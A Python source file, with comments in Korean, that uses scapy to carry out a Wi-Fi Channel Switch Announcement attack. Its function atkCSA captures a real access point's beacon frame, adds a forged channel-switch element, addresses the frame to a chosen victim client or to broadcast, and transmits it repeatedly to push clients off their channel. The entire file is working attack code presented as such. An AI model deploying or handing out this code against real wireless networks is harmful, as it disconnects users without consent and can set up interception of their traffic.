from scapy.all import conf, sendp
from scapy.layers.dot11 import Dot11EltCSA
from cls_collBeacon import collBeacon
import time
    
def atkCSA(vicAddr:str, bssAddr:str, loopMax=0, newChannel=100, pkt=''):
    collCls = collBeacon()
    
    if pkt != '':
        collCls.pkt = pkt
    elif collCls.pkt == '':
        collCls.bssid = bssAddr
        collCls.runSniff()
    # 잡힌 Beacon Frame이 없으면 실제 원본 프레임을 수집
    
    pktCSA = collCls.pkt /\
        Dot11EltCSA(mode=1, new_channel=newChannel, channel_switch_count=1)
    # CSA 필드 추가
    
    vicAddr = vicAddr.upper()
    if vicAddr != 'FF:FF:FF:FF:FF:FF':
        pktCSA.addr1 = vicAddr
    # 유니캐스트 전송이면, Dst Addr을 바꿔줌
 
    conf.verb = 0
    loopCnt = 0
    while(True):
        sendp(pktCSA)
        loopCnt += 1
        print('Beacon Frame with CSA Sent ('+str(loopCnt) +'). (AP='+bssAddr + ' -> CLI='+vicAddr+')')
        if loopMax != 0:
            if loopCnt >= loopMax:
                break
            # loopMax가 지정되면 특정 횟수만 반복
        else:
            time.sleep(0.3)